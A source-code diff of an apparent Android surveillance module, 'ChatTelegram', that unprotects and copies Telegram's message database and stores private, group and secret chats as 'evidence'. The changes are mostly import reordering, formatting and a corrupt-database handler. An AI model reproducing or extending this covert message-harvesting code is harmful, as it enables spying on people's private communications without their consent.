@@ -1,19 +1,18 @@
 package com.android.dvci.module.chat;
 
-import java.io.DataInputStream;
-import java.io.File;
-import java.io.IOException;
-import java.nio.ByteBuffer;
-import java.nio.ByteOrder;
-import java.nio.MappedByteBuffer;
-import java.util.ArrayList;
-import java.util.Date;
-import java.util.Hashtable;
-import java.util.List;
-import java.util.concurrent.Semaphore;
+import android.database.Cursor;
+import android.database.sqlite.SQLiteDatabaseCorruptException;
+import android.util.Base64;
 
-import javax.xml.parsers.DocumentBuilderFactory;
-import javax.xml.parsers.ParserConfigurationException;
+import com.android.dvci.auto.Cfg;
+import com.android.dvci.db.GenericSqliteHelper;
+import com.android.dvci.db.RecordHashPairVisitor;
+import com.android.dvci.db.RecordVisitor;
+import com.android.dvci.file.Path;
+import com.android.dvci.module.ModuleAddressBook;
+import com.android.dvci.util.Check;
+import com.android.dvci.util.StringUtils;
+import com.android.mm.M;
 
 import org.w3c.dom.Document;
 import org.w3c.dom.NamedNodeMap;
@@ -21,23 +20,18 @@ import org.w3c.dom.Node;
 import org.w3c.dom.NodeList;
 import org.xml.sax.SAXException;
 
-import android.database.Cursor;
-import android.location.GpsStatus.Listener;
-import android.util.Base64;
+import java.io.File;
+import java.io.IOException;
+import java.nio.ByteBuffer;
+import java.nio.ByteOrder;
+import java.nio.MappedByteBuffer;
+import java.util.ArrayList;
+import java.util.Date;
+import java.util.List;
+import java.util.concurrent.Semaphore;
 
-import com.android.dvci.Standby;
-import com.android.dvci.auto.Cfg;
-import com.android.dvci.db.GenericSqliteHelper;
-import com.android.dvci.db.RecordHashPairVisitor;
-import com.android.dvci.db.RecordHashtableIdVisitor;
-import com.android.dvci.db.RecordStringVisitor;
-import com.android.dvci.db.RecordVisitor;
-import com.android.dvci.file.Path;
-import com.android.dvci.interfaces.Observer;
-import com.android.dvci.module.ModuleAddressBook;
-import com.android.dvci.util.Check;
-import com.android.dvci.util.StringUtils;
-import com.android.mm.M;
+import javax.xml.parsers.DocumentBuilderFactory;
+import javax.xml.parsers.ParserConfigurationException;
 
 public class ChatTelegram extends SubModuleChat {
 	public class TelegramConversation {
@@ -116,7 +110,8 @@ public class ChatTelegram extends SubModuleChat {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (updateHistory) " + fast);
 		}
-		if (!started || !readChatSemaphore.tryAcquire()) {
+
+		if (!started|| !readChatSemaphore.tryAcquire()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (updateHistory), semaphore red");
 			}
@@ -129,7 +124,7 @@ public class ChatTelegram extends SubModuleChat {
 			}
 
 			helper = GenericSqliteHelper.open(dbFile);
-			if(helper == null){
+			if (helper == null) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (updateHistory) cannot open db");
 				}
@@ -164,6 +159,7 @@ public class ChatTelegram extends SubModuleChat {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (start) ");
 		}
+
 		if (!readChatSemaphore.tryAcquire()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (start), semaphore red");
@@ -184,7 +180,7 @@ public class ChatTelegram extends SubModuleChat {
 			Path.unprotect(dbFile + "*", true);
 
 			helper = GenericSqliteHelper.openCopy(dbFile);
-			if(helper == null){
+			if (helper == null) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (start) cannot open db");
 				}
@@ -310,6 +306,12 @@ public class ChatTelegram extends SubModuleChat {
 			}
 
 			return Math.max(lastmessageS, Math.max(lastmessageP, lastmessageG));
+		} catch (SQLiteDatabaseCorruptException ex) {
+			enabled = false;
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (readTelegramMessageHistory) Error: ", ex);
+			}
+			return 0;
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readTelegramMessageHistory) Error: ", ex);
@@ -328,7 +330,7 @@ public class ChatTelegram extends SubModuleChat {
 			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
 			MessageRecordVisitor visitor = new MessageRecordVisitor(messages);
-			long lastmessage = helper.traverseRawQuery(sqlquery, new String[] { Long.toString(lastTelegram) }, visitor);
+			long lastmessage = helper.traverseRawQuery(sqlquery, new String[]{Long.toString(lastTelegram)}, visitor);
 
 			if (!messages.isEmpty()) {
 				getModule().saveEvidence(messages);
@@ -352,7 +354,7 @@ public class ChatTelegram extends SubModuleChat {
 		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 		MessageRecordVisitor visitor = new MessageRecordVisitor(messages);
 
-		long lastmessage = helper.traverseRawQuery(sqlquery, new String[] { Long.toString(lastTelegram) }, visitor);
+		long lastmessage = helper.traverseRawQuery(sqlquery, new String[]{Long.toString(lastTelegram)}, visitor);
 
 		if (!messages.isEmpty()) {
 			getModule().saveEvidence(messages);
@@ -377,7 +379,7 @@ public class ChatTelegram extends SubModuleChat {
 				Check.log(TAG + " (readTelegramGroupChatHistory) uid: " + Long.toString(-tc.uid));
 			}
 			long lastmessage = helper.traverseRawQuery(sqlquery,
-					new String[] { Long.toString(lastTelegram), Long.toString(-tc.uid) }, visitor);
+					new String[]{Long.toString(lastTelegram), Long.toString(-tc.uid)}, visitor);
 
 			if (!messages.isEmpty()) {
 				getModule().saveEvidence(messages);
@@ -390,7 +392,7 @@ public class ChatTelegram extends SubModuleChat {
 	}
 
 	private List<TelegramConversation> getTelegramGroups(GenericSqliteHelper helper, final RecordHashPairVisitor users,
-			final ChatGroups groups) {
+	                                                     final ChatGroups groups) {
 
 		final List<TelegramConversation> conversations = new ArrayList<TelegramConversation>();
 
@@ -586,7 +588,9 @@ public class ChatTelegram extends SubModuleChat {
 
 			return created_time;
 		}
-	};
+	}
+
+	;
 
 	public String readString(ByteBuffer in) {
 		try {
